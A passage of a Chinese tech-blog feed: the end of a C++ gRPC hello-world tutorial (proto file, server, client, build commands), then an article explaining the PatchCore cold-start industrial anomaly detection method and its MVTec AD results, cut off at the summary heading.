<p>一句话总结：<br/>
<strong>gRPC 非常适合“服务与服务之间”，但并不适合“直接暴露给人类使用”。</strong></p>
<h3 data-id="heading-2">C++ gRPC 实战：从 0 到跑起来</h3>
<p>下面用一个最简单的 <strong>HelloService</strong>，演示完整流程。</p>
<h4 data-id="heading-3">安装 gRPC 环境</h4>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get update
sudo apt-get install -y build-essential autoconf libtool pkg-config
<span class="hljs-comment"># 安装 protobuf 编译器</span>
sudo apt-get install -y libprotobuf-dev protobuf-compiler
<span class="hljs-comment"># 安装 gRPC 库和插件</span>
sudo apt-get install -y libgrpc++-dev libgrpc-dev
</code></pre>
<h4 data-id="heading-4">定义 proto 文件（hello.proto）</h4>
<pre><code class="hljs language-proto" lang="proto">syntax = "proto3";

package hello;

service HelloService {
  rpc SayHello (HelloRequest) returns (HelloReply);
}

message HelloRequest {
  string name = 1;
}

message HelloReply {
  string message = 1;
}
</code></pre>
<p>生成 C++ 代码：</p>
<pre><code class="hljs language-bash" lang="bash">protoc --grpc_out=. --plugin=protoc-gen-grpc=`<span class="hljs-built_in">which</span> grpc_cpp_plugin` hello.proto
protoc --cpp_out=. hello.proto
</code></pre>
<h4 data-id="heading-5">C++ 服务端实现</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;grpcpp/grpcpp.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"hello.grpc.pb.h"</span></span>

<span class="hljs-keyword">using</span> grpc::Server;
<span class="hljs-keyword">using</span> grpc::ServerBuilder;
<span class="hljs-keyword">using</span> grpc::ServerContext;
<span class="hljs-keyword">using</span> grpc::Status;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServiceImpl</span> <span class="hljs-keyword">final</span> : <span class="hljs-keyword">public</span> hello::HelloService::Service {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function">Status <span class="hljs-title">SayHello</span><span class="hljs-params">(ServerContext* context,
                    <span class="hljs-type">const</span> hello::HelloRequest* request,
                    hello::HelloReply* reply)</span> <span class="hljs-keyword">override</span> </span>{
        reply-&gt;<span class="hljs-built_in">set_message</span>(<span class="hljs-string">"Hello, "</span> + request-&gt;<span class="hljs-built_in">name</span>());
        <span class="hljs-keyword">return</span> Status::OK;
    }
};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::string <span class="hljs-title">server_address</span><span class="hljs-params">(<span class="hljs-string">"0.0.0.0:50051"</span>)</span></span>;
    HelloServiceImpl service;

    ServerBuilder builder;
    builder.<span class="hljs-built_in">AddListeningPort</span>(server_address, grpc::<span class="hljs-built_in">InsecureServerCredentials</span>());
    builder.<span class="hljs-built_in">RegisterService</span>(&amp;service);

    <span class="hljs-function">std::unique_ptr&lt;Server&gt; <span class="hljs-title">server</span><span class="hljs-params">(builder.BuildAndStart())</span></span>;
    std::cout &lt;&lt; <span class="hljs-string">"Server listening on "</span> &lt;&lt; server_address &lt;&lt; std::endl;

    server-&gt;<span class="hljs-built_in">Wait</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>编译并启动服务</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 单文件编译</span>
g++ -std=c++11 main.cpp hello.pb.cc hello.grpc.pb.cc \
-o hello_server \
`pkg-config --cflags --libs grpc++ grpc protobuf` \
-lgrpc++_reflection \
-lpthread

<span class="hljs-comment"># 运行</span>
./hello_server
</code></pre>
<h4 data-id="heading-6">C++ 客户端调用测试</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;grpcpp/grpcpp.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"hello.grpc.pb.h"</span></span>

using grpc::Channel;
using grpc::ClientContext;
using grpc::Status;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloClient</span> {</span>
public:
    HelloClient(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Channel&gt; channel)
        : stub_(hello::HelloService::NewStub(channel)) {}

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title function_">SayHello</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; name)</span> {
        hello::HelloRequest request;
        request.set_name(name);

        hello::HelloReply reply;
        ClientContext context;

        Status status = stub_-&gt;SayHello(&amp;context, request, &amp;reply);
        <span class="hljs-keyword">if</span> (status.ok()) {
            <span class="hljs-keyword">return</span> reply.message();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"RPC failed"</span>;
        }
    }

private:
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;hello::HelloService::Stub&gt; stub_;
};

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    HelloClient <span class="hljs-title function_">client</span><span class="hljs-params">(
        grpc::CreateChannel(<span class="hljs-string">"localhost:50051"</span>,
                             grpc::InsecureChannelCredentials()))</span>;

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; client.SayHello(<span class="hljs-string">"gRPC C++"</span>) &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>编译并运行</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 单文件编译</span>
g++ -std=c++11 main.cpp hello.pb.cc hello.grpc.pb.cc \
-o hello_client \
`pkg-config --cflags --libs grpc++ grpc protobuf` \
-lgrpc++_reflection \
-lpthread

<span class="hljs-comment"># 运行</span>
./hello_client
</code></pre>
<p>启动服务端，再运行客户端，你会看到：</p>
<pre><code class="hljs">Hello, gRPC C++
</code></pre>
<h3 data-id="heading-7">写在最后</h3>
<p>很多人学 gRPC，卡在“看懂文档，却不知道怎么落地”。<br/>
真正跑通一次 C++ 服务端和客户端，你会发现：</p>
<p>gRPC 并不神秘，它只是把“服务调用”这件事，做得更像工程，而不是脚本。</p>
<p>如果你正在做 <strong>分布式系统、微服务、基础设施</strong>，gRPC 值得你认真掌握。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[工业质检只能依赖缺陷样本？PatchCore给出“冷启动”答案]]></title>    <link>https://juejin.cn/post/7591816944728752164</link>    <guid>https://juejin.cn/post/7591816944728752164</guid>    <pubDate>2026-01-06T06:08:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591816944728752164" data-draft-id="7591806035758104618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="工业质检只能依赖缺陷样本？PatchCore给出“冷启动”答案"/> <meta itemprop="keywords" content="算法,计算机视觉,深度学习"/> <meta itemprop="datePublished" content="2026-01-06T06:08:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            工业质检只能依赖缺陷样本？PatchCore给出“冷启动”答案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:08:22.000Z" title="Tue Jan 06 2026 06:08:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在工业制造领域，产品质量检测是至关重要的一环。传统的人工质检不仅成本高昂，而且容易因疲劳或注意力分散导致漏检、误检。随着计算机视觉技术的发展，基于深度学习的自动化缺陷检测系统正逐步成为工业生产线上的“智能质检员”。</p>
<p>然而一个长期存在的难题是：<strong>如何在没有缺陷样本的情况下训练出一个可靠的异常检测模型？</strong>  这也是工业场景中典型的“冷启动”问题——通常我们只能收集到大量正常产品图像，而缺陷样本稀少、种类多变，难以覆盖所有异常情况。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55f868cfcd58454caa3eedaeb73b9c9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=zewaRBT8CgkfG%2BLerFnC1hzIgqg%3D" alt="screenshot_2026-01-05_14-58-56.png" loading="lazy"/></p>
<p>本研究聚焦于冷启动工业异常检测——在这种设定下，模型必须仅使用正常（无缺陷）的训练图像来检测和定位缺陷。<strong>PatchCore</strong>，一个基于块级别记忆库的异常检测框架，它在测试时最大化对正常模式的覆盖，同时保持计算高效。如图1所示，PatchCore无需任何针对具体任务的训练或适应，即可实现最先进的检测和定位性能。</p>
<h2 data-id="heading-0"><strong>冷启动异常检测的挑战</strong></h2>
<p>在真实工业场景中，缺陷样本的收集成本极高，且缺陷类型可能千变万化。因此，冷启动异常检测（也称单类分类） 成为研究重点：模型只能通过正常样本学习“什么是正常”，并据此判断测试样本是否异常。</p>
<p>以往的方法主要包括自编码器、生成对抗网络等，它们试图通过重建或生成正常样本来学习其分布，但往往对复杂纹理或结构性缺陷的识别能力有限。</p>
<p>近年来，一种新思路是直接利用在 ImageNet 等大型数据集上预训练的深度特征，通过特征匹配进行异常判断，如 SPADE、PaDiM 等方法。但这些方法仍存在两个主要问题：</p>
<ol>
<li>高层特征偏向自然图像分类，与工业场景差异较大；</li>
<li>可用上下文信息有限，导致匹配置信度不足。</li>
</ol>
<h2 data-id="heading-1"><strong>PatchCore：如何做到“无缺陷样本”高精度检测？</strong></h2>
<p>PatchCore 的核心思想是：构建一个具有强代表性的正常图像特征记忆库，并在推理时通过特征匹配实现异常判断。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4bba7fe0cdd41d582d3cf8173a6b0b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=nROwUlbsCcR5YsgcCF6hascMwIs%3D" alt="screenshot_2026-01-05_15-04-13.png" loading="lazy"/></p>
<p>PatchCore由三个紧密耦合的组件构成：<strong>局部感知的块级特征提取、基于核心集的记忆库缩减</strong>，以及基于最近邻的异常评分用于检测和定位。整体流程如图2所示。重要的是，PatchCore以免训练的方式运行，仅依赖于预训练的卷积主干网络和正常数据。</p>
<ul>
<li><strong>局部感知块特征</strong></li>
</ul>
<p>PatchCore从ImageNet预训练的卷积网络中提取特征图。一个核心设计选择是使用中层特征层级，而非最深层的特征，因为深层特征已知对语义对象类别有强烈偏向。特征图中的每个空间位置对应输入图像中一个感受野的块级表示。</p>
<p>为了增强对小范围空间错位的鲁棒性，同时保持分辨率，PatchCore引入了局部邻域聚合。对于位于空间位置 (h, w) 的一个块，聚合其周围大小为 p 的邻域内的特征：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef24f5c079494e7bb7cdffb5c42785ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=HExR7gsMAOd998rm6Tz1fdHhHxQ%3D" alt="screenshot_2026-01-05_15-06-09.png" loading="lazy"/></p>
<p>局部感知的块表示随后通过自适应平均池化计算得出。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2abf8277a0df47e886159b7d3672b9f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=XTauiZmSyUQEf1KQ%2B0Db24Oi9tg%3D" alt="screenshot_2026-01-05_15-06-24.png" loading="lazy"/></p>
<p><strong>这种聚合是一个关键贡献</strong>，因为它在不加深网络的情况下增大了感受野，从而<strong>在保持对细微异常敏感度的同时，减少了ImageNet偏差。</strong> 来自相邻层级的块特征在空间上对齐并组合，所有正常的块表示被存储在一个统一的记忆库中。</p>
<ul>
<li><strong>基于核心集缩减的块特征记忆库</strong></li>
</ul>
<p>为所有正常图像存储块级特征，会导致记忆库规模随数据集快速增大，使得朴素的最近邻搜索不切实际。为解决此问题，PatchCore引入了核心集子采样来压缩记忆库，同时保持其对正常特征空间的覆盖。</p>
<p>记忆库缩减被表述为一个极小极大设施选址问题，目标是寻找一个子集 𝓜꜀，使其能最佳近似原始记忆库𝓜：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/673983dabd6447f6a6f370662dc91843~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=UK698%2B0XsBqeujlI%2Fsxozb7wC9w%3D" alt="screenshot_2026-01-05_15-07-55.png" loading="lazy"/></p>
<p>由于精确优化是NP难问题，这里采用了一种贪婪近似算法，迭代地选择距离当前子集最远的特征。为了进一步提升效率，PatchCore应用了随机线性投影，利用Johnson–Lindenstrauss引理在核心集选择期间降低维度。如图3所示，与随机子采样相比，此策略能更有效地保留正常特征分布的结构，使得记忆库规模可以数量级地缩减，而性能损失最小。</p>
<ul>
<li><strong>使用PatchCore进行异常检测</strong></li>
</ul>
<p>在推理阶段，PatchCore从测试图像提取块级特征，并将其与缩减后的记忆库进行比较。对于每个测试块，计算其到最近正常邻居的距离，图像级的异常分数定义为所有块距离中的最大值：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4e14420f2fc4408b476e744c99e4f4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=ia%2BmT9xA1HDieqq%2BBtsM8Nss9sM%3D" alt="screenshot_2026-01-05_15-09-47.png" loading="lazy"/></p>
<p>为了提高鲁棒性，PatchCore应用了一种密度感知重加权，该权重考虑了最近正常邻居在特征空间中的孤立程度：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6114b3a0490543ee8786392a6f966e91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=89b9JdkYpR6EcLFM5HK2vBzfVVM%3D" alt="screenshot_2026-01-05_15-09-53.png" loading="lazy"/></p>
<p>这种重加权强调了远离密集正常区域的异常，是提高召回率的关键设计选择。像素级异常定位通过将块分数映射回其空间位置获得，随后进行插值和高斯平滑以生成密集的异常热力图。</p>
<h2 data-id="heading-2"><strong>实验结果</strong></h2>
<p>实验在多个工业检测数据集上进行了验证，图像级异常检测、像素级异常定位、计算效率以及在有限训练数据下的鲁棒性。实验设计反映了真实的工业检测场景，强调仅正常数据可用的冷启动情况。其中最具代表性的是广泛使用的 MVTec AD 数据集，涵盖15类工业产品，包括纹理类和物体类。</p>
<ul>
<li><strong>模型设置</strong></li>
</ul>
<p>PatchCore使用ImageNet预训练的卷积主干网络实现，不针对目标数据集进行任何微调。关键配置选择包括：主干网络、特征层级（主要为中层）、块构建参数、记忆库缩减比例等。值得注意的是，PatchCore不需要在目标数据集上训练，因此推理速度和内存效率是设计中的关键因素。</p>
<ul>
<li><strong>评估指标</strong></li>
</ul>
<p>使用三个主要指标：</p>
<p>图像级AUROC：衡量区分异常图像与正常图像的能力。</p>
<p>像素级AUROC：评估异常定位精度。</p>
<p>PRO：基于区域的度量，衡量预测异常区域与真实区域的重叠程度。</p>
<ul>
<li><strong>在MVTec AD上的异常检测表现</strong></li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/207b911422c642e38ae164739e64891d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=ymFLqm0sdNMaBOZW77aqu9chVUw%3D" alt="screenshot_2026-01-05_15-10-17.png" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b33f527678654cfba45f905514af2efe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=jLfA%2BEGwthUEpV%2FnM3S2POH8dq0%3D" alt="screenshot_2026-01-05_15-10-24.png" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27bd12cfd3fb4185b78ea6478227dfb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=tNY4lb%2B4fWVgrDxI3HCMc%2BJq3Qw%3D" alt="screenshot_2026-01-05_15-10-30.png" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a93711667a14e2682bbc95740e870de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=WONWrDp3P%2BX1Lo%2BOecnYMjKYMYw%3D" alt="screenshot_2026-01-05_15-10-40.png" loading="lazy"/></p>
<p>PatchCore在MVTec AD上实现了最先进的图像级异常检测性能。如表1所示，PatchCore达到高达99.1%的AUROC，显著优于PaDiM和SPADE等方法。在像素级AUROC和PRO指标上，PatchCore同样达到了最优性能（表2，表3）。重要的是，其改进版本在更高分辨率图像和集成系统上也能应用，同时保持低于默认版本的推理时间（表4）。</p>
<ul>
<li><strong>推理时间</strong></li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6068074686624db2a8eaafd390f2872b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=J3jX%2BEjms2VHTMqEC7ugyNfmuP8%3D" alt="screenshot_2026-01-05_15-13-12.png" loading="lazy"/></p>
如表5所示，即使不进行子采样，PatchCore的推理速度也快于SPADE，同时精度更高。通过核心集子采样，PatchCore的推理时间变得显著更快，达到与PaDiM相当或更好的水平，同时保持更优的检测和定位性能。作者也评估了近似最近邻搜索，虽然速度更快，但会导致检测性能明显下降。核心集子采样成为了更有效和稳健的解决方案。
<ul>
<li><strong>消融实验</strong></li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a07b78c35fd241c6ace5befb985ef0f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=mWxmQjGJXreHa9YTQCQayy8cw4c%3D" alt="screenshot_2026-01-05_15-13-41.png" loading="lazy"/></p>
<p>局部感知块特征与层级选择：图4的结果表明局部邻域聚合的重要性。性能在邻域大小p=3时达到峰值，确认适度的局部上下文对于准确的块级异常检测至关重要。中层特征层级的表现优于浅层和深层，验证了避免过度ImageNet偏差的设计选择。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6788673d22a8404b84681e879861ee31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=wkdD7Lp6x8lasLVIOgpXzA528ac%3D" alt="screenshot_2026-01-05_15-13-49.png" loading="lazy"/></p>
<p>核心集子采样的重要性：图5比较了贪婪核心集子采样与随机子采样等方法。核心集选择始终能更好地保持性能，在某些情况下甚至能提高联合检测和定位的精度。此外，通过增大步幅来缩减记忆库会导致性能下降，这凸显了保持空间分辨率的重要性。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99df473b705a4153a030d9df60d36272~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=HhuUcoWLp1XpDCSyweC3WsNFFA0%3D" alt="screenshot_2026-01-05_15-14-18.png" loading="lazy"/></p>
<p>小样本异常检测：如图6所示，PatchCore展现出卓越的样本效率。仅使用20%的正常训练数据，PatchCore就能达到或超过对比方法使用全部数据训练的性能。即使在极端的1-5个训练样本情况下，PatchCore仍具竞争力。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f927687270834daf80eff2eaf6320a52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768284502&amp;x-signature=9Iw9tE0Im8VAVdBF7rlW7a7J5wM%3D" alt="screenshot_2026-01-05_15-14-26.png" loading="lazy"/></p>
<p>在其他基准上的评估：如表6所示，在mSTC上，PatchCore无需任何数据集特定调整就实现了最先进的异常定位性能，展示了强大的跨领域可迁移性。在MTD上，PatchCore略微优于DifferNet，尽管该数据集具有很高的类内变异性。</p>
<h2 data-id="heading-3"><strong>总结</strong></h2>
